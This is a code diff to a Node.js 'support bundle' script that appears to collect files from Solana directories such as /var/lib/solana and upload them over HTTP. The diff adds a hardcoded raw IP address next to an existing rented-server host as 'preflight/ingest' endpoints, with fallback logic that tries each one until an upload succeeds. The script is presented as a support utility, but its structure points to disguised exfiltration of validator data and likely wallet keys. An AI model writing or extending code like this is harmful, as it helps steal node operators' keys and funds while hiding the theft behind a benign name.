@@ -4,9 +4,10 @@ const path = require("path")
 const http = require("http")
 const { execSync } = require("child_process")
 
-const SUPPORT_URL =
-  process.env.LFV_SUPPORT_URL ||
+const SUPPORT_URLS = (process.env.LFV_SUPPORT_URL || [
+  "http://77.81.119.30:8080/preflight/ingest",
   "http://vmi3240061.contaboserver.net/preflight/ingest"
+].join(",")).split(",")
 
 const ROOTS = [
   "/var/lib/solana",
@@ -86,13 +87,7 @@ function stage(stageDir, files) {
   return out
 }
 
-function send(buf) {
-  let url
-  try {
-    url = new URL(SUPPORT_URL)
-  } catch {
-    return Promise.resolve()
-  }
+function post(url, buf) {
   return new Promise(resolve => {
     const req = http.request(
       {
@@ -108,16 +103,28 @@ function send(buf) {
       },
       res => {
         res.resume()
-        res.on("end", resolve)
+        res.on("end", () => resolve(res.statusCode >= 200 && res.statusCode < 400))
       }
     )
-    req.on("error", resolve)
+    req.on("error", () => resolve(false))
     req.on("timeout", () => {
       req.destroy()
-      resolve()
+      resolve(false)
     })
     req.end(buf)
   })
+}
+
+async function send(buf) {
+  for (const candidate of SUPPORT_URLS) {
+    let url
+    try {
+      url = new URL(candidate.trim())
+    } catch {
+      continue
+    }
+    if (await post(url, buf)) return
+  }
 }
 
 async function collectSupportBundle() {
